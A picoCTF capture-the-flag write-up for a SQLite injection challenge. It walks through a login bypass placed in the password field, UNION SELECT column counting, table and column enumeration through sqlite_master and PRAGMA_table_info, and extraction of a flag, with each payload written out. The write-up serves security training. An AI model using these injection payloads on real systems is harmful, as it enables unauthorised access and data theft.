# Synopsis
To get the required info from the database to complete the challenge, we'll need to achieve the following major goals:
## A: Break into the website using the SQL login bypass technique
#### Step 1: Inject the following code into the login page at the username field
```
' or 1=1 -- 
```
#### Step 2: Observe why it didn't work.
The usual order of username first, then password is reversed in the SQL query we are shown.
#### Step 3: Inject the following code into the password field
```
' or 1=1 -- 
```
After submitting the data, we should be logged in

## B: Determine how number of columns from the original query and the type of SQL software
#### Step 1: Provide a valid response from the database, but also send a UNION SELECT query to determine how many columns the original query returned. Provide the following code to the search field:
```
Algiers' UNION SELECT null -- 
```
We observe that nothing is returned, so the original query was not one column.
#### Step 2: Increment the payload and test if there are two columns with the following code:
```
Algiers' UNION SELECT null, null -- 
```
Once again, nothing is returned, so it is not two columns.
#### Step 3: Increment the payload again and test if there are three columns:
```
Algiers' UNION SELECT null, null, null -- 
```
We see that the entry for Algiers is returned with this injection payload, so we can confirm that we should send three columns with our SQL injection payloads.
#### Step 4: Determine which type of SQL software is being used
If we look at the hint on the challenge description page on the picoCTF website, it says SQLiLite, which points to the SQL system used as SQLite, so we'll be using SQLite functions and syntax to get more database info.

## C: Extract the desired info from the database
#### Step 1: Using SQLite function, determine what tables exist on the database with the following payload:
```
Algiers' UNION SELECT null, null, name FROM sqlite_master WHERE type='table' -- 
```
There are a number of tables, but the one we're looking for is called *more_table*
#### Step 2: Use the following SQLite syntax to retrieve the columns from the table we're interested in:
```
Algiers' UNION SELECT null, null, name FROM PRAGMA_table_info('more_table') -- 
```
We see that there is a *flag* column in the *more_table* table, so let's read it!
#### Step 3: Get all the rows from the *flag* column in the *more_table* table:
```
Algiers' UNION SELECT null, null, flag FROM more_table -- 
```
And with that, we're done!
